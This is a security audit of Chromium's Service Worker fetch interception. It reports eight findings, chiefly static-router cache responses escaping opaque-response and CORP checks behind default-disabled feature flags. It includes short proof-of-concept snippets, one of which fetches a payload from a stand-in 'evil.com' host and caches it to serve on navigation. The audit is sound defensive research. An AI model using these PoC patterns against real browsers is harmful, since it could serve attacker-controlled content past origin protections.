# Service Worker Fetch Event Interception Security Audit

## Audit Scope
Chromium source code audit of Service Worker fetch event interception for CORS bypass, origin confusion, and information leak vulnerabilities.

**Files analyzed:**
- `content/browser/service_worker/service_worker_fetch_dispatcher.cc`
- `content/browser/service_worker/service_worker_main_resource_loader.cc`
- `content/browser/service_worker/service_worker_controllee_request_handler.cc`
- `content/browser/service_worker/service_worker_loader_helpers.cc`
- `content/browser/service_worker/service_worker_security_utils.cc`
- `content/browser/service_worker/service_worker_cache_storage_matcher.cc`
- `content/common/service_worker/service_worker_resource_loader.cc`
- `content/common/service_worker/service_worker_router_evaluator.cc`
- `content/renderer/service_worker/service_worker_subresource_loader.cc`
- `third_party/blink/renderer/modules/service_worker/fetch_respond_with_observer.cc`
- `third_party/blink/renderer/modules/service_worker/fetch_event.cc`
- `third_party/blink/renderer/modules/service_worker/cross_origin_resource_policy_checker.cc`
- `third_party/blink/common/service_worker/service_worker_loader_helpers.cc`

---

## Finding 1: Static Router Cache Source Bypasses Opaque Response Validation (Feature-Gated)

### Vulnerability Hypothesis
When the Service Worker static routing API routes a request to a `cache` source, the cached opaque response may be served for navigations or non-`no-cors` requests, bypassing the response type validation that `FetchRespondWithObserver::OnResponseFulfilled()` normally enforces.

### Relevant Code

**service_worker_main_resource_loader.cc:914-935:**
```cpp
if (response_head_->service_worker_router_info->matched_source_type ==
    network::mojom::ServiceWorkerRouterSourceType::kCache) {
  // ...
  if (!IsValidStaticRouterResponse(
          resource_request_, response,
          container_host->policy_container_policies()
              .cross_origin_embedder_policy,
          /* ... */) &&
      base::FeatureList::IsEnabled(
          features::kServiceWorkerStaticRouterOpaqueCheck)) {
    CommitCompleted(net::ERR_FAILED,
                    "Invalid response from static router");
    return;
  }
}
```

**content/common/features.cc:709-710:**
```cpp
BASE_FEATURE(kServiceWorkerStaticRouterOpaqueCheck,
             base::FEATURE_DISABLED_BY_DEFAULT);
```

### Exploitability: HIGH (conditional on feature flag being disabled, which is the default)

The `kServiceWorkerStaticRouterOpaqueCheck` feature flag is **disabled by default**. This means that when a SW uses the static router API with a `cache` source, opaque responses retrieved from the cache are NOT validated against the request mode. A SW can:

1. Cache an opaque cross-origin response via `no-cors` fetch
2. Register a static router rule with `cache` source matching `navigate` mode requests
3. The opaque response would be served for navigation without the type check that `FetchRespondWithObserver` enforces

This bypasses the check in `FetchRespondWithObserver::OnResponseFulfilled()` (line 277-293) which blocks opaque responses for non-`no-cors` requests and for client requests.

### PoC Concept
```javascript
// In service worker install event:
self.addEventListener('install', async (event) => {
  const cache = await caches.open('exploit-cache');
  // Store an opaque cross-origin response
  const response = await fetch('https://evil.com/payload', {mode: 'no-cors'});
  await cache.put('/target-page', response);
});

// Static router registration:
// { condition: { urlPattern: '/target-page' }, source: 'cache' }
// The opaque response is served to the navigation without type validation.
```

### Note
The CORP check via `kServiceWorkerStaticRouterCORPCheck` is also **disabled by default** (features.cc:703-704), compounding this issue.

---

## Finding 2: Static Router CORP Check Disabled by Default

### Vulnerability Hypothesis
When the static router serves a response from cache, the Cross-Origin-Resource-Policy (CORP) check is gated behind `kServiceWorkerStaticRouterCORPCheck` which is disabled by default, allowing responses that violate CORP to be served to the client.

### Relevant Code

**service_worker_resource_loader.cc:97-113:**
```cpp
CORPCheckResult result = CORPCheckResult::kSuccess;
bool is_enabled = base::FeatureList::IsEnabled(
    features::kServiceWorkerStaticRouterCORPCheck);
if (network::CrossOriginResourcePolicy::IsBlockedByHeaderValue(
        resource_request.url, resource_request.url,
        resource_request.request_initiator, corp_header_value,
        resource_request.mode, resource_request.destination,
        response->request_include_credentials, cross_origin_embedder_policy,
        is_enabled ? cross_origin_embedder_policy_reporter : nullptr,
        document_isolation_policy,
        is_enabled ? document_isolation_policy_reporter : nullptr)) {
  if (is_enabled) {
    is_valid = false;
    result = CORPCheckResult::kBlocked;
  } else {
    result = CORPCheckResult::kViolation;  // logged but NOT blocked
  }
}
```

**content/common/features.cc:703-704:**
```cpp
BASE_FEATURE(kServiceWorkerStaticRouterCORPCheck,
             base::FEATURE_DISABLED_BY_DEFAULT);
```

### Exploitability: MEDIUM

When the feature is disabled (default), CORP violations are only *logged* as `kViolation` via UMA histogram, but the response is still delivered to the client. This means a page with `Cross-Origin-Embedder-Policy: require-corp` that uses a SW with a static router `cache` source can receive responses that would otherwise be blocked by CORP.

A cross-origin resource with `Cross-Origin-Resource-Policy: same-origin` cached by the SW can be served to the page via static router, bypassing the protection that CORP was designed to provide.

### PoC Concept
```javascript
// Page has: Cross-Origin-Embedder-Policy: require-corp
// SW caches a cross-origin resource without CORP header,
// then static router serves it from cache.
// With kServiceWorkerStaticRouterCORPCheck disabled,
// the response is served despite CORP violation.
```

---

## Finding 3: No Browser-Side Response Type Validation for SW-Intercepted Navigations

### Vulnerability Hypothesis
When a Service Worker responds to a fetch event via `respondWith()`, the response type validation occurs entirely in the renderer process (in `FetchRespondWithObserver::OnResponseFulfilled()`). The browser process does NOT re-validate the response type against the request mode.

### Relevant Code

**fetch_respond_with_observer.cc:256-304 (renderer-side validation):**
The validation is comprehensive here:
- Error responses rejected (line 267-269)
- CORS response rejected for same-origin mode (line 271-276)
- Opaque response rejected for non-no-cors mode (line 277-281)
- Opaque response rejected for client requests (line 288-293)
- OpaqueRedirect rejected unless manual redirect (line 294-298)
- Redirected responses rejected for non-follow mode (line 299-304)

**service_worker_main_resource_loader.cc:975-984 (browser-side):**
```cpp
// A response with status code 0 is Blink telling us to respond with
// network error.
if (response->status_code == 0) {
  CommitCompleted(net::ERR_FAILED, "Zero response status");
  return;
}
```

The browser side only checks `status_code == 0`. It does NOT validate `response_type` against `request_mode`. It trusts the renderer entirely.

**service_worker_loader_helpers.cc (SaveResponseInfo) line 121:**
```cpp
out_head->response_type = response.response_type;
```
The response type is directly passed through from the SW's response.

### Exploitability: LOW (requires compromised renderer)

In a normal scenario, the renderer-side checks in `FetchRespondWithObserver` are sufficient because the SW runs in the SW's renderer process, which is same-origin by definition. However, if a SW renderer process is compromised (e.g., via a separate renderer exploit), a malicious renderer could send arbitrary response types to the browser process through the Mojo IPC (`ServiceWorkerFetchResponseCallback::OnResponse()`), bypassing the renderer-side validation. The browser blindly trusts the response type and propagates it.

This is a defense-in-depth concern rather than a directly exploitable vulnerability, but it could amplify a renderer compromise.

---

## Finding 4: CORP Bypass for Synthesized SW Responses (Empty URL List)

### Vulnerability Hypothesis
When a Service Worker creates a synthetic response (e.g., `new Response('body')`), the URL list is empty. The CORP checker in the renderer (`CrossOriginResourcePolicyChecker::IsBlocked()`) explicitly returns `false` (not blocked) for responses with empty URL lists, considering them same-origin. A SW could synthesize responses with arbitrary headers including fake CORS headers.

### Relevant Code

**cross_origin_resource_policy_checker.cc:35-39:**
```cpp
bool CrossOriginResourcePolicyChecker::IsBlocked(
    const url::Origin& initiator_origin,
    network::mojom::RequestMode request_mode,
    network::mojom::RequestDestination request_destination,
    const blink::Response& response) {
  if (response.InternalURLList().empty()) {
    // The response is synthesized in the service worker, so it's considered as
    // the same origin.
    return false;
  }
```

### Exploitability: LOW-MEDIUM

This is by design -- a SW can only serve responses for requests within its scope, and a synthesized response (empty URL list) is treated as same-origin because the SW is same-origin with its controlled pages. However, this means:

1. A SW can synthesize a response with any headers, including `Access-Control-Allow-Origin: *`, and it will bypass CORP checking entirely.
2. The synthesized response headers pass through `SaveResponseHeaders()` (service_worker_loader_helpers.cc:49-111) which builds HTTP headers from the SW's response headers map with no filtering of security-sensitive headers.

This is largely by spec -- a same-origin SW has full control over responses to its controlled pages. The risk is if downstream consumers of the response rely on headers like `Access-Control-Allow-Origin` for security decisions and don't account for the `was_fetched_via_service_worker` flag.

---

## Finding 5: SSLInfo Inheritance from SW Script, Not from Actual Response

### Vulnerability Hypothesis
When a Service Worker intercepts a navigation and provides a response, the SSLInfo (certificate info, etc.) is inherited from the SW's own script response, not from the actual response being served. This could create a misleading security indicator.

### Relevant Code

**service_worker_main_resource_loader.cc:1284-1286:**
```cpp
// Make the navigated page inherit the SSLInfo from its controller service
// worker's script. This affects the HTTPS padlock, etc, shown by the
// browser.
DCHECK(version->GetMainScriptResponse());
response_head_->ssl_info = version->GetMainScriptResponse()->ssl_info;
```

### Exploitability: LOW

The comment acknowledges this design. Since the SW must be same-origin and served over HTTPS, the SSLInfo of the SW script and the actual response should normally be similar. However, this means:
- If the SW script was fetched with a certificate that has since been revoked, the browser would still show a valid padlock.
- The navigated page's security indicator does not reflect the actual response's certificate chain.
- A SW could serve stale or synthesized content while the browser shows the SW script's valid certificate state.

This is a known design trade-off documented in https://crbug.com/392409.

---

## Finding 6: Race Network Request / AutoPreload Response Bypasses Fetch Event Validation

### Vulnerability Hypothesis
When `RaceNetworkRequest` or `AutoPreload` wins the race against the SW fetch event handler, the response from the network is committed directly without passing through the SW's response type validation.

### Relevant Code

**service_worker_main_resource_loader.cc:839-850:**
```cpp
case FetchResponseFrom::kWithoutServiceWorker:
  // If the response of RaceNetworkRequest is already handled, discard the
  // fetch handler result but consume data pipes here not to make data for
  // the fetch handler being stuck.
  if (!body_as_stream.is_null() && body_as_stream->stream.is_valid() &&
      race_network_request_url_loader_client_) {
    race_network_request_url_loader_client_->DrainData(
        std::move(body_as_stream->stream));
  }
  return;
```

### Exploitability: NOT EXPLOITABLE

This is actually correct behavior. When the network wins the race, the response comes directly from the network stack, which applies its own full set of security checks (CORS, mixed content, CSP, etc.). The SW fetch handler's response is discarded. There is no security bypass here because the network response is properly validated by the normal network loading path.

---

## Finding 7: Static Router `cache` Source for `kRaceNetworkAndCache` Skips Validation

### Vulnerability Hypothesis
When a `kRaceNetworkAndCache` static router source is used and the cache wins, the cache response validation only applies for `kCache` source type, not for `kRaceNetworkAndCache`.

### Relevant Code

**service_worker_subresource_loader.cc:1499-1513:**
```cpp
// Block invalid responses from the static router.
if (response_head_->service_worker_router_info &&
    response_head_->service_worker_router_info->matched_source_type ==
        network::mojom::ServiceWorkerRouterSourceType::kCache) {
  if (!IsValidStaticRouterResponse(/* ... */) &&
      base::FeatureList::IsEnabled(
          features::kServiceWorkerStaticRouterOpaqueCheck)) {
    CommitCompleted(net::ERR_FAILED, "Invalid response from static router");
    return;
  }
}
```

The check is `matched_source_type == kCache` -- it does NOT cover `kRaceNetworkAndCache`. When a `race-network-and-cache` router rule is used and the cache response wins, the opaque/CORP validation is skipped entirely.

Similarly in **service_worker_main_resource_loader.cc:915-916:**
```cpp
if (response_head_->service_worker_router_info->matched_source_type ==
    network::mojom::ServiceWorkerRouterSourceType::kCache) {
```

### Exploitability: MEDIUM

This is a logic bug. The `kRaceNetworkAndCache` source type can serve cached responses that bypass the same validation that is (behind feature flags) applied to `kCache` source responses. An attacker-controlled SW can use `race-network-and-cache` instead of `cache` as the router source to avoid even the feature-gated opaque response check.

### PoC Concept
```javascript
// In SW:
// Register static router with race-network-and-cache (not just cache)
// When cache wins the race, opaque response validation is skipped
await event.addRoutes([{
  condition: { urlPattern: '/*' },
  source: 'race-network-and-cache'
}]);
```

---

## Finding 8: SaveResponseHeaders Passes Through All SW-Provided Headers

### Vulnerability Hypothesis
When a SW responds with a synthetic response, `SaveResponseHeaders()` constructs HTTP response headers from the SW's header map without any filtering or sanitization. A SW can inject arbitrary security-sensitive headers.

### Relevant Code

**service_worker_loader_helpers.cc (blink/common):49-65:**
```cpp
void SaveResponseHeaders(const mojom::FetchAPIResponse& response,
                         network::mojom::URLResponseHead* out_head) {
  std::string buf(base::StringPrintf("HTTP/1.1 %d %s\r\n",
      response.status_code, response.status_text.c_str()));
  for (const auto& item : response.headers) {
    buf.append(item.first);
    buf.append(": ");
    buf.append(item.second);
    buf.append("\r\n");
  }
  buf.append("\r\n");
  out_head->headers = base::MakeRefCounted<net::HttpResponseHeaders>(
      net::HttpUtil::AssembleRawHeaders(buf));
```

### Exploitability: LOW (by design, but with caveats)

A SW has full control over response headers for its scope. This is by specification. However, the pass-through of ALL headers means:
- Fake `Content-Security-Policy` headers could weaken CSP
- Fake `X-Frame-Options` could disable framing protection
- Fake `Cross-Origin-Opener-Policy` / `Cross-Origin-Embedder-Policy` could alter process isolation decisions

The key concern is that downstream code may not consistently check `was_fetched_via_service_worker` when making security decisions based on these headers. Any code path that trusts response headers but doesn't verify the response provenance is vulnerable.

---

## Summary

| # | Finding | Severity | Exploitable? |
|---|---------|----------|-------------|
| 1 | Static Router Cache Source Bypasses Opaque Response Validation | High | Yes (feature flag disabled by default) |
| 2 | Static Router CORP Check Disabled by Default | Medium | Yes (feature flag disabled by default) |
| 3 | No Browser-Side Response Type Validation | Low | Only with compromised renderer |
| 4 | CORP Bypass for Synthesized SW Responses | Low-Medium | Partially by design |
| 5 | SSLInfo Inheritance from SW Script | Low | Known design trade-off |
| 6 | Race Network Request Bypasses SW Validation | N/A | Not exploitable (correct behavior) |
| 7 | `kRaceNetworkAndCache` Skips Cache Validation | Medium | Yes (logic bug) |
| 8 | Unfiltered Header Pass-Through | Low | By design with caveats |

### Key Findings for Follow-Up

**Finding 1 and Finding 7 are the most actionable.** Finding 1 is partially known (the feature flags exist as future mitigations) but the default-disabled state means real-world Chrome users are currently exposed. Finding 7 is a logic bug where `kRaceNetworkAndCache` is not covered by the same validation as `kCache`, which appears to be an oversight.

**Finding 2** compounds Finding 1 by also leaving CORP enforcement disabled for static router cache responses.

The renderer-side validation in `FetchRespondWithObserver` is comprehensive and well-implemented. The main gaps are in the newer static router API code paths that bypass the fetch event entirely and lack equivalent validation.
